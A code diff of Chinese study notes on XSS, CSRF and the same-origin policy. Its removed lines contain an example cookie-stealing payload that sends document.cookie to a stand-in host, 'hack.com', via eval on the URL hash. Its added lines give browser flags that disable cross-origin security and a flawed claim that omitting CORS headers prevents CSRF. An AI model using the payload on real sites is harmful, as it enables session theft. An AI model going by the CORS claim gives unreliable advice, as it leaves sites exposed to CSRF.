@@ -1,61 +1,32 @@
-CVE
+
+# XSS (Cross Site Script/跨站脚本攻击) 
+在A网站的服务端数据库 or 客户端dom中“篡改”恶意代码，或者在A网站访问链接中嵌入恶意代码，当用户访问A网站时，代码获取到A网站的cookie发送给黑客；
+防御）只能靠开发者，客户端用户再小心也难免中招；方法1：在cookie中设置了HttpOnly属性，那么通过js脚本将无法通过document.cookie读取到cookie信息
+
 
 # CSRF (Cross-site request forgery/跨站请求伪造)
 1）前提：用户登录了A网站，有cookie；
-2）登录了恶意网页B，网页的代码中会请求A网站；（相当于用户在不知情的情况下访问了A网站，如果A网站的接口是转账等接口，那么就会有财产损失）
-防御）一般现代浏览器请求头都有：
+2）用户登录了B网页（某恶意网站，或者A网站中被“篡改”了的页面），网页的恶意代码（脚本或资源访问链接）中会请求A网站；（相当于用户在不知情的情况下访问了A网站的某接口，如果该接口是转账等接口，那么就会有财产损失）
+防御）服务端开发不要添加"Access-Control-Allow-Origin"响应头，这时候通常现代浏览器就会进行拦截（当然可能有一些老旧的有漏洞的浏览器例外）；（同源的请求-不跨域除外，见下方）
+如果服务端确实有需要放通的需求，可以添加"Access-Control-Allow-Origin"响应头，可以读取请求头中的Referer和Host字段来进行逻辑处理；
+有安全风险的接口还应该使用更安全的验证身份的方法进行验证；
+客户端用户小心使用不要访问不靠谱的网站；
 
-# XSS (Cross Site Script/跨站脚本攻击) 
-
-
-是当用户访问一个被内嵌了恶意代码的网站时，即使这个网站是官方网站，比如qq空间，还是会发送此网站的cookie给黑客
-XSS 是在目标网站上放恶意脚本等着用户访问。
-CSRF 是在恶意网站上跨域向目标网站发出访问请求(例如<img href>)，特点是无需JavaScript且要求用户已经登陆过目标网站。
-
-如果我是网站开发者
-在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，具体一点的介绍请google进行搜索
-
-如果百度上有个链接地址是
-http://www.baidu.com/#new%20Image().src="http://hack.com?cookie="+escape(document.cookie)
-同时页面会执行了如下script脚本
-eval(location.hash.substr(1));
-//location.hash 获取#和后面的东西
-那么谁访问后都会把cookie泄露
-
-
+ps）客户端有办法设置成关闭跨域拦截：
+chrome完全关闭状态，设置启动快捷方式的属性，在exe后面加上 --args --disable-web-security --user-data-dir跨域参数
+ie 在internet安全设置下，设置允许【跨域浏览窗口和框架】和【通过域访问数据源】
 
 同源是指，域名，协议，端口相同。
-
-比如说，下面的几个域名是同源的：
-
+比如说，下面几个是同源的：
 http://example.com/
-
 http://example.com:80/
-
 http://example.com/path/file
 
-它们都具有相同的协议、相同的域名、相同的端口(不指定端口默认80)。
-
 而下面几个域名是不同源的：
-
 http://example.com/
-
-http://example.com:8080/
-
-http://www.example.com/
-
-https://example.com:80/
-
 https://example.com/
-
-http://example.org/
-
-http://ietf.org/
-
-它们有不同的协议或不同的域名或不同的端口，要注意顶级域名和二级域名也是认为不同的域名。
-————————————————
-版权声明：本文为CSDN博主「汤姆丁1111」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
-原文链接：https://blog.csdn.net/weixin_53841730/article/details/128812393
+http://example.com:8080/
+http://www.example.com/
 
 
 
